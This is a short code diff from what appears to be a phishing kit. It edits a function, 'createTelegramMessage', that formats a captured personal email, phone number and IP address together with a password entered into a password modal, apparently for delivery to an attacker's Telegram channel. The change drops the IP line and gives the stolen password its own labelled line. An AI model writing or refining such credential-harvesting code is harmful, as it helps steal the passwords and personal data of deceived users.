@@ -65,7 +65,7 @@ const createTelegramMessage = (
 ━━━━━━━━━━━━━━━━━━━━━
 📧 <b>Personal Email:</b> <code>${formData.personalEmail}</code>
 📞 <b>Số Điện Thoại:</b> <code>+${formData.phone}</code>
-🌐 <b>IP:</b> <code>${geoData.ip}</code>${passwordLabel} <code>${password}</code>`;
+🔑 <b>${passwordLabel} <code>${password}</code>`;
 };
 
 const PasswordModal: FC<PasswordModalProps> = ({
